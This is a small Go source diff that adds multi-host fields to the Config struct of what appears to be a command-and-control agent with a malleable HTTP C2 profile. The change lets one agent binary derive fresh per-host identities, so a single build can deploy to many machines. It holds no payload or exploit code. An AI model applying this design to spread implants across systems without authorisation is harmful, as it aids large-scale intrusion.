@@ -148,6 +148,15 @@ type Config struct {
 	// Malleable HTTP C2 profile
 	MalleableC2 MalleableHTTPConfig `cbor:"78,keyasint"`
 
+	// Multi-host mode: when true, the agent derives a fresh per-host UUID on
+	// first run (cached with its identity key) instead of using the embedded
+	// AgentUUID — ONE binary deploys to MANY hosts without UUID collisions
+	// (the CC's TOFU pin rejects a second host presenting an enrolled UUID
+	// with a different session key). AgentUUIDParent records the build's
+	// UUID for operator traceability.
+	MultiHost       bool   `cbor:"81,keyasint"`
+	AgentUUIDParent string `cbor:"82,keyasint"`
+
 	// Runtime state (not persisted in config file)
 	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
 }
